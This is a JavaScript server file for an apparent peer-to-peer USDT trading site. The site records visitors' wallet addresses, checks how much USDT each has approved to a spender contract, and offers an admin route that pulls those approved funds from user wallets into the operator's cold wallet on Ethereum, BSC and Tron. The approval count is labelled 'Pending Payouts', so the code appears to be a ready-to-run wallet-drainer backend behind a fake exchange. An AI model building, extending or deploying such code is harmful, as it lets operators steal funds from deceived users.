import 'dotenv/config';
import express from 'express';
import http from 'http';
import cors from 'cors';
import mongoose from 'mongoose';
import { Server as IOServer } from 'socket.io';
import { createPublicClient, createWalletClient, http as viemHttp, formatUnits, parseUnits } from 'viem';
import { mainnet, bsc } from 'viem/chains';
import { privateKeyToAccount } from 'viem/accounts';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const TronWeb = require('tronweb');

// --- Mongoose Models ---
import Trader from './models/Trader.js';
import Ad from './models/Ad.js';
import Wallet from './models/Wallet.js';
import AdminUser from './models/AdminUser.js';
import Settings from './models/Settings.js';

// --- Environment Variables ---
const {
  MONGO_URI, CORS_ORIGIN = '*', PORT = 3001,

  ETH_RPC, BSC_RPC, TRON_FULLNODE,
  ADMIN_EVM_PRIVATE_KEY, ADMIN_TRON_PRIVATE_KEY,

  USDT_ETH, USDT_BSC, USDT_TRON,
  SPENDER_ETH, SPENDER_BSC, SPENDER_TRON,

  JWT_SECRET, // For admin login
  ADMIN_COLD_WALLET_EVM, // For secure payouts
  ADMIN_COLD_WALLET_TRON // For secure payouts
} = process.env;

if (!JWT_SECRET || !ADMIN_COLD_WALLET_EVM || !ADMIN_COLD_WALLET_TRON) {
  console.error('[FATAL ERROR] Missing required .env variables: JWT_SECRET, ADMIN_COLD_WALLET_EVM, or ADMIN_COLD_WALLET_TRON');
  process.exit(1);
}

// --- App & Server Setup ---
const app = express();
app.use(cors({ origin: CORS_ORIGIN }));
app.use(express.json());

const server = http.createServer(app);
const io = new IOServer(server, { cors: { origin: CORS_ORIGIN, methods: ['GET','POST'] } });

/* ---------------- Mongo ---------------- */
await mongoose.connect(MONGO_URI, { dbName: 'p2p' });
console.log('MongoDB Connected.');

/* --------------- Socket.io (Unchanged as requested) ------------- */
const inmemChats = {}; // Chat history remains in memory
io.on('connection', (s) => {
  s.on('joinRoom', (room) => { s.join(room); s.emit('chatHistory', inmemChats[room] || []); });
  s.on('adminJoinRoom', (room) => { s.join(room); s.emit('chatHistory', inmemChats[room] || []); });
  s.on('sendMessage', ({ roomName, message }) => {
    if (!inmemChats[roomName]) inmemChats[roomName] = [];
    inmemChats[roomName].push(message);
    io.to(roomName).emit('receiveMessage', message);
  });
});

/* ---------------- On-chain clients (Unchanged) ---------------- */
const ERC20_ABI = [
  { type:'function', name:'decimals', stateMutability:'view', inputs:[], outputs:[{type:'uint8'}] },
  { type:'function', name:'allowance', stateMutability:'view', inputs:[{name:'owner',type:'address'},{name:'spender',type:'address'}], outputs:[{type:'uint256'}] },
  { type:'function', name:'transferFrom', stateMutability:'nonpayable', inputs:[{name:'from',type:'address'},{name:'to',type:'address'},{name:'value',type:'uint256'}], outputs:[{type:'bool'}] },
];

const ethClient  = createPublicClient({ chain: mainnet, transport: viemHttp(ETH_RPC) });
const bscClient  = createPublicClient({ chain: bsc,     transport: viemHttp(BSC_RPC) });
const evmAccount = ADMIN_EVM_PRIVATE_KEY ? privateKeyToAccount(ADMIN_EVM_PRIVATE_KEY) : null;
const ethWallet  = evmAccount ? createWalletClient({ account: evmAccount, chain: mainnet, transport: viemHttp(ETH_RPC) }) : null;
const bscWallet  = evmAccount ? createWalletClient({ account: evmAccount, chain: bsc,     transport: viemHttp(BSC_RPC) }) : null;

const tronWeb = new TronWeb.TronWeb({ fullHost: TRON_FULLNODE, privateKey: ADMIN_TRON_PRIVATE_KEY || undefined });
const TRC20_ABI = [
  { name:'decimals', type:'function', stateMutability:'view', inputs:[], outputs:[{type:'uint8'}] },
  { name:'allowance', type:'function', stateMutability:'view', inputs:[{type:'address'},{type:'address'}], outputs:[{type:'uint256'}] },
  { name:'transferFrom', type:'function', stateMutability:'nonpayable', inputs:[{type:'address'},{type:'address'},{type:'uint256'}], outputs:[{type:'bool'}] },
];

const byNetwork = {
  'ERC-20': { client: ethClient, wallet: ethWallet, token: USDT_ETH, spender: SPENDER_ETH, chain: mainnet },
  'BEP-20': { client: bscClient, wallet: bscWallet, token: USDT_BSC, spender: SPENDER_BSC, chain: bsc },
  'TRC-20': { tron: tronWeb, token: USDT_TRON, spender: SPENDER_TRON },
};

/* ---------------- NEW: Spender Contract ABIs ---------------- */
// PASTE YOUR EVM CONTRACT ABI HERE
const SPENDER_CONTRACT_ABI = [
  {
    "inputs": [
      { "internalType": "address", "name": "_userAddress", "type": "address" },
      { "internalType": "address", "name": "_recipient", "type": "address" },
      { "internalType": "uint256", "name": "_amount", "type": "uint256" }
    ],
    "name": "executeTransfer", // <-- RENAME THIS if your function is different
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
];

// PASTE YOUR TRON CONTRACT ABI HERE
const TRC20_SPENDER_ABI = [
  {
    "inputs": [
      { "name": "_userAddress", "type": "address" },
      { "name": "_recipient", "type": "address" },
      { "name": "_amount", "type": "uint256" }
    ],
    "name": "executeTransfer", // <-- RENAME THIS if your function is different
    "outputs": [],
    "stateMutability": "Nonpayable",
    "type": "Function"
  }
];

/* ---------------- NEW: Auth Middleware ---------------- */
const authMiddleware = (req, res, next) => {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Unauthorized: No token provided' });
  }
  const token = authHeader.split(' ')[1];
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.admin = decoded; // Attach admin payload to request
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Unauthorized: Invalid token' });
  }
};

/* ---------------- NEW: Admin Auth Routes ---------------- */
app.post('/api/admin/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.status(400).json({ error: 'Username and password required' });
    }
    
    const admin = await AdminUser.findOne({ username });
    if (!admin) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    const isMatch = await bcrypt.compare(password, admin.password);
    if (!isMatch) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    const token = jwt.sign(
      { id: admin._id, username: admin.username },
      JWT_SECRET,
      { expiresIn: '1d' } // Token expires in 1 day
    );
    
    res.json({ message: 'Login successful', token });

  } catch (error) {
    console.error('[ADMIN_LOGIN_ERROR]', error);
    res.status(500).json({ error: 'Server error during login' });
  }
});

app.get('/health', (_req, res) => res.status(200).send('OK'));


/* ---------------- NEW: Admin Stats Route ---------------- */

// Helper function to check a single wallet's approval status
const checkWalletApproval = async (wallet) => {
  try {
    if (wallet.network === 'TRC-20') {
      const cfg = byNetwork['TRC-20'];
      const c = await cfg.tron.contract(TRC20_ABI, cfg.token);
      const [dec, raw] = await Promise.all([
        c.decimals().call(),
        c.allowance(wallet.address, cfg.spender).call(),
      ]);
      const decimals = Number(dec ?? 6);
      const approvedAmount = Number(formatUnits(BigInt(raw.toString()), decimals));
      return { ...wallet, approved: approvedAmount > 0, approvedAmount, status: approvedAmount > 0 ? 'approved' : 'connected' };
    }

    const cfg = byNetwork[wallet.network];
    if (!cfg?.client) throw new Error('No client');
    
    const [decimals, raw] = await Promise.all([
      cfg.client.readContract({ abi: ERC20_ABI, address: cfg.token, functionName: 'decimals' }),
      cfg.client.readContract({ abi: ERC20_ABI, address: cfg.token, functionName: 'allowance', args: [wallet.address, cfg.spender] })
    ]);
    
    const approvedAmount = Number(formatUnits(raw, Number(decimals ?? 6)));
    return { ...wallet, approved: approvedAmount > 0, approvedAmount, status: approvedAmount > 0 ? 'approved' : 'connected' };
  } catch (e) {
    return { ...wallet, approved: false, approvedAmount: 0, status: 'error', error: e.message };
  }
};

app.get('/api/admin/stats', authMiddleware, async (req, res) => {
  try {
    // 1. Get Trader Stats
    const [tradeStats, activeUsers] = await Promise.all([
      Trader.aggregate([
        { $group: { _id: null, total: { $sum: '$totalTrades' } } }
      ]),
      Trader.countDocuments({ online: true })
    ]);

    // 2. Get Wallet Stats (This is the "slow" part, but necessary and fine for an admin dash)
    const allWallets = await Wallet.find().lean();
    const approvalChecks = allWallets.map(w => checkWalletApproval(w));
    const approvalResults = await Promise.all(approvalChecks);
    const approvedWalletsCount = approvalResults.filter(r => r.approvedAmount > 0).length;

    res.json({
      totalTrades: tradeStats[0]?.total || 0,
      activeUsers: activeUsers || 0,
      connectedWallets: allWallets.length,
      approvedWallets: approvedWalletsCount, // This is "Pending Payouts"
      totalVolume: 0, // No "Trade" model to calculate this from.
    });
    
  } catch (error) {
    console.error('[STATS_ERROR]', error);
    res.status(500).json({ error: 'Failed to fetch dashboard stats' });
  }
});

/* ---------------- NEW: Settings Routes ---------------- */

// Helper to get or create settings
const getSettings = async () => {
    let settings = await Settings.findOne();
    if (!settings) {
        console.log('No settings found, creating default settings...');
        settings = await Settings.create({
          platformFee: 0.1,
          minTradeAmount: 100,
          supportEmail: 'support@example.com',
          maintenanceMode: false
        });
    }
    return settings;
}

app.get('/api/settings', authMiddleware, async (req, res) => {
  try {
    const settings = await getSettings();
    res.json(settings);
  } catch (error) {
    console.error('[GET_SETTINGS_ERROR]', error);
    res.status(500).json({ error: 'Failed to get settings' });
  }
});

app.put('/api/settings', authMiddleware, async (req, res) => {
  try {
    const { _id, ...updateData } = req.body;
    const settings = await Settings.findOneAndUpdate({}, updateData, { new: true, upsert: true });
    res.json(settings);
  } catch (error) {
    console.error('[PUT_SETTINGS_ERROR]', error);
    res.status(500).json({ error: 'Failed to update settings' });
  }
});


/* ---------------- PUBLIC API Routes (No Auth) ---------------- */

// Get all traders (public)
app.get('/api/traders', async (_req, res) => {
  const list = await Trader.find().sort({ id: 1 }).lean();
  res.json(list);
});

// Get all ads (public)
app.get('/api/ads', async (_req, res) => {
  const list = await Ad.find().sort({ id: 1 }).lean();
  res.json(list);
});

// Get chat rooms (public, for admin panel list)
app.get('/api/chat/rooms', (_req,res)=> res.json(Object.keys(inmemChats)));

// Connect wallet (public)
app.post('/api/wallets/connect', async (req,res) => {
  const { address, network, walletClient } = req.body || {};
  if (!address || !network) return res.status(400).json({ error:'address & network required' });
  
  // Use updateOne with upsert to prevent duplicates
  await Wallet.updateOne(
    { address: String(address), network: network }, 
    { $setOnInsert: { createdAt: new Date() }, $set: { walletClient: walletClient || 'unknown' } }, 
    { upsert: true }
  );
  res.json({ ok:true });
});

/* ---------------- SECURE ADMIN API Routes (Auth Required) ---------------- */

// --- Trader CRUD (SECURED) ---
app.post('/api/traders', authMiddleware, async (req, res) => {
  const created = await Trader.create(req.body);
  res.status(201).json(created.toObject());
});

app.delete('/api/traders/:id', authMiddleware, async (req, res) => {
  const id = Number(req.params.id);
  await Trader.deleteOne({ id });
  res.status(204).end();
});

app.put('/api/traders/:id/status', authMiddleware, async (req, res) => {
  const id = Number(req.params.id);
  const t = await Trader.findOneAndUpdate({ id }, { online: !!req.body.online }, { new: true });
  if (!t) return res.status(404).json({ error: 'Trader not found' });
  res.json(t.toObject());
});


// --- Ads CRUD (SECURED) ---
app.post('/api/ads', authMiddleware, async (req, res) => {
  const created = await Ad.create(req.body);
  res.status(201).json(created.toObject());
});

app.delete('/api/ads/:id', authMiddleware, async (req, res) => {
  const id = Number(req.params.id);
  await Ad.deleteOne({ id });
  res.status(204).end();
});

app.put('/api/ads/:id/status', authMiddleware, async (req, res) => {
  const id = Number(req.params.id);
  const a = await Ad.findOneAndUpdate({ id }, { active: !!req.body.active }, { new: true });
  if (!a) return res.status(404).json({ error: 'Ad not found' });
  res.json(a.toObject());
});


// --- Wallet Management (SECURED) ---

/** Get all wallets and enrich with LIVE approval data */
app.get('/api/wallets', authMiddleware, async (_req,res) => {
  const docs = await Wallet.find().sort({ createdAt: -1 }).lean();

  // map & enrich in parallel
  const enriched = await Promise.all(docs.map(async (w) => {
    const checkedWallet = await checkWalletApproval(w);
    return { ...checkedWallet, id: w._id, lastUpdated: new Date().toISOString() };
  }));

  res.json(enriched);
});

/** SECURE: Send USDT using admin signer via transferFrom(user -> admin cold wallet) */
app.put('/api/wallets/:id/send', authMiddleware, async (req,res) => {
  // CRITICAL: Only 'amount' is read from body. 'recipient' is ignored.
  const { amount } = req.body || {};
  
  if (!amount || amount <= 0) return res.status(400).json({ error:'Positive amount required' });
  
  const doc = await Wallet.findById(req.params.id).lean();
  if (!doc) return res.status(404).json({ error:'wallet not found' });

  try {
    if (doc.network === 'TRC-20') {
      // SECURE: Recipient is from .env, not req.body
      const recipient = ADMIN_COLD_WALLET_TRON; 
      if (!recipient) throw new Error('Admin TRON cold wallet not configured on server');
      
      const tw = byNetwork['TRC-20'].tron;
      const c = await tw.contract(TRC20_ABI, byNetwork['TRC-20'].token);
      const dec = Number((await c.decimals().call()) ?? 6);
      const value = parseUnits(String(amount), dec).toString();
      const allowanceRaw = await c.allowance(doc.address, SPENDER_TRON).call();
      const allowance = BigInt(allowanceRaw.toString());
      if (allowance < BigInt(value)) {
        throw new Error(`User allowance is insufficient. Has: ${formatUnits(allowance, dec)}, Needs: ${amount}`);
      }
      

      const spenderContract = await tw.contract(TRC20_SPENDER_ABI, byNetwork['TRC-20'].spender);
      const tx = await spenderContract.executeTransfer(doc.address, recipient, value).send({ feeLimit: 50_000_000 });
      return res.json({ ok:true, txHash: tx });
    }

    // --- EVM Logic ---
    // SECURE: Recipient is from .env, not req.body
    const recipient = ADMIN_COLD_WALLET_EVM;
    if (!recipient) throw new Error('Admin EVM cold wallet not configured on server');

    const cfg = byNetwork[doc.network];
    if (!cfg?.wallet) return res.status(500).json({ error:'Admin EVM signer wallet not configured' });

    const decimals = await cfg.client.readContract({ abi: ERC20_ABI, address: cfg.token, functionName: 'decimals' });
    const value = parseUnits(String(amount), Number(decimals ?? 6));

    const allowance = await cfg.client.readContract({
      abi: ERC20_ABI,
      address: cfg.token,
      functionName: 'allowance',
      args: [doc.address, cfg.spender]
    });
    
    if (allowance < value) {
      throw new Error(`User allowance is insufficient. Has: ${formatUnits(allowance, Number(decimals))}, Needs: ${amount}`);
    }

    const hash = await cfg.wallet.writeContract({
      abi: SPENDER_CONTRACT_ABI,
      address: cfg.spender,
      functionName: 'executeTransfer',
      args: [doc.address, recipient, value], 
    });
    return res.json({ ok:true, txHash: hash });

  } catch (e) {
    console.error('[SEND_ERROR]', e);
    return res.status(400).json({ error: e.shortMessage || e.message || 'Send failed' });
  }
});

/* --------------- Server Start ---------------- */
server.listen(PORT, '0.0.0.0', () => {
  console.log(`API Server listening on port ${PORT}`);
});